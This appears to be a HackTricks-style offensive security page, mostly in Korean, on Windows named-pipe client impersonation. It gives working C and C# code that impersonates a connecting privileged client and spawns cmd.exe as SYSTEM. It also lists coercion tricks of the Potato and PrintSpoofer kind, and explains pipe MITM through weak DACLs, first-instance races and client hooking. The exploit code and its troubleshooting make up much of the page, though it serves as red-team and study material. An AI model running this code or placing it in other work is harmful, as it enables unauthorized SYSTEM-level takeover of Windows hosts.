# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation은 named-pipe server thread가 자신에게 연결하는 client의 security context를 채택하게 해주는 local privilege escalation primitive입니다. 실제로, SeImpersonatePrivilege로 코드를 실행할 수 있는 attacker는 privileged client(예: SYSTEM service)가 attacker-controlled pipe에 연결하도록 유도하고, ImpersonateNamedPipeClient를 호출한 뒤, 생성된 token을 primary token으로 duplicate하고, client로서 process를 spawn할 수 있습니다(보통 NT AUTHORITY\SYSTEM).

이 페이지는 핵심 technique에 집중합니다. SYSTEM을 your pipe로 유도하는 end-to-end exploit chain은 아래에 언급된 Potato family pages를 참조하세요.

## TL;DR
- named pipe 생성: \\.\pipe\<random> 그리고 connection을 기다립니다.
- privileged component가 그곳에 connect하도록 만듭니다(spooler/DCOM/EFSRPC/etc.).
- pipe에서 최소 한 번 message를 읽은 다음, ImpersonateNamedPipeClient를 호출합니다.
- 현재 thread에서 impersonation token을 열고, DuplicateTokenEx(TokenPrimary)를 수행한 뒤, CreateProcessWithTokenW/CreateProcessAsUser로 SYSTEM process를 얻습니다.

## Requirements and key APIs
- 호출하는 process/thread에 일반적으로 필요한 privileges:
- SeImpersonatePrivilege: 연결한 client를 성공적으로 impersonate하고 CreateProcessWithTokenW를 사용하기 위해 필요합니다.
- 또는 SYSTEM을 impersonate한 뒤에는 CreateProcessAsUser를 사용할 수 있는데, 이 경우 SeAssignPrimaryTokenPrivilege와 SeIncreaseQuotaPrivilege가 필요할 수 있습니다(이들은 SYSTEM을 impersonate하고 있을 때 충족됩니다).
- 사용되는 핵심 APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation 전에 최소 한 개의 message를 읽어야 합니다)
- ImpersonateNamedPipeClient 및 RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW 또는 CreateProcessAsUser
- Impersonation level: 로컬에서 유용한 작업을 수행하려면 client가 SecurityImpersonation을 허용해야 합니다(많은 local RPC/named-pipe client의 기본값). client는 pipe를 열 때 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION을 사용해 이를 낮출 수 있습니다.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
이 기술들은 privileged services가 당신의 named pipe에 연결하도록 강제해, 그들을 impersonate할 수 있게 한다:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

자세한 사용법과 호환성은 여기에서 확인:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

서비스 trigger로 pipe를 만들고 impersonate해서 SYSTEM을 띄우는 전체 예제가 필요하다면, 다음을 보라:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

privileged service와 low-privileged process가 `\\.\pipe\...` 를 통해 통신할 때는, 그 pipe를 다른 untrusted IPC boundary처럼 취급하라. classic server-side impersonation을 넘어서, weak pipe ACLs, unsafe creation flags, 그리고 client-side trust decisions도 모두 local privilege escalation primitive가 될 수 있다.

### 후보 pipe를 먼저 열거하라
- PowerShell로 pipe를 빠르게 나열: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe`는 instance count와 single-instance pipes를 찾는 데 유용하다.
- `SYSTEM`으로 실행되는 services가 사용하는 이름을 우선하라, 특히 helpers, updaters, launchers, UI brokers.

### permissive DACL과 extra pipe instances를 통한 MITM
- privileged server와 통신할 수 있는 process는 이미 그 protocol을 fuzz하고 privileged verbs를 찾을 수 있다.
- 더 흥미로운 경우는 DACL이 pipe object에 `FILE_GENERIC_WRITE`/`GENERIC_WRITE`를 허용할 때다. named pipes에서는 이것이 암묵적으로 `FILE_CREATE_PIPE_INSTANCE`를 포함하며 (`FILE_APPEND_DATA`가 같은 bit를 공유), 공격자는 같은 이름의 또 다른 server instance를 생성할 수 있다.
- instance는 FIFO 순서로 매칭되므로, 공격자가 만든 instance와 legitimate instance가 섞일 수 있다: `CreateNamedPipe`로 rogue instance를 만들고, 같은 pipe name을 `CreateFile`로 연 뒤, 실제 client가 rogue server instance에 도착하기를 기다린다.
- 결과: 원래 server process를 소유하지 않아도 privileged IPC를 관찰, 수정, relay, 또는 desynchronize 할 수 있다.

### pipe security descriptors에서의 first-instance race
- `lpSecurityAttributes`는 pipe name의 첫 번째 instance가 생성될 때만 DACL을 정의한다.
- privileged service가 늦게 시작하고 `FILE_FLAG_FIRST_PIPE_INSTANCE`를 사용하지 않으면, 공격자는 permissive DACL로 pipe name을 미리 생성한 뒤, service가 나중에 공격자가 선택한 security context 아래에서 later instances를 만들게 할 수 있다.
- 이는 service startup을 race condition으로 바꾼다: first instance를 차지한 뒤, 약화된 ACL을 사용해 later clients와 연결하거나 MITM하라.
- 방어자에게는 mitigation이고, 공격자에게는 핵심 review point다: `CreateNamedPipe(..., dwOpenMode, ...)`에 `FILE_FLAG_FIRST_PIPE_INSTANCE`가 포함되는지 확인하라. 없으면 service 시작 전에 pre-creation을 시험하라.

### PID/signature checks는 boundary가 아니라 hardening이다
- 일부 제품은 `GetNamedPipeClientProcessId`, process image path, 또는 연결한 client의 Authenticode signer를 확인해 접근을 제한하려 한다.
- 이는 신뢰된 process 내부에 inject하기 전까지만 유효하다: trusted process 안에 들어가면 server가 기대하는 정확한 PID/image/signature context를 그대로 물려받는다.
- split desktop apps의 경우, `SYSTEM` service를 직접 공격하는 것보다 low-privileged UI/helper process를 instrumenting하는 편이 더 쉽다.

### I/O model에 맞춰 client를 hook하라
- Synchronous I/O: syscall이 buffer를 소비하기 전에 `NtWriteFile`을 가로채고, 반환된 뒤 `NtReadFile`을 검사/패치하라.
- Overlapped I/O: `NtReadFile`에서 본 `OVERLAPPED`/`IoStatusBlock`을 저장한 다음, `GetOverlappedResult` 또는 관련 wait가 완료된 뒤 buffer를 검사하라.
- Completion ports: `GetQueuedCompletionStatus`는 `NtRemoveIoCompletion`에 도달한다; 반환된 `ApcContext`는 원래 read에 사용된 `OVERLAPPED`와 다시 연결되며, 이는 이제 채워진 buffer를 찾기 위한 올바른 pivot이다.
- Completion routines (`ReadFileEx`): completion callback은 APC로 전달된다. 반환된 data를 변조하거나 synthetic replies를 주입하고 싶다면 real completion routine을 hook하고, custom injection을 위해서는 routine의 3개 예상 arguments를 재구성하는 one-argument `QueueUserAPC` dispatcher를 사용하라.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)은 injected helper DLL을 통해 named-pipe traffic을 proxy하고, editing/replay를 위한 Burp-like workflow를 제공한다.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)는 Frida-based 접근을 사용하며 `NtReadFile`/`NtWriteFile`과 위의 async/completion pivot에 집중한 뒤, traffic을 WebSocket-backed editing workflow로 전달한다.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port/APC-driven clients need different hooks than simple `ReadFile`/`WriteFile` detours.
- Injection into the trusted client is noisy and generally best kept for exploit development, protocol reversing, or local lab fuzzing.

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
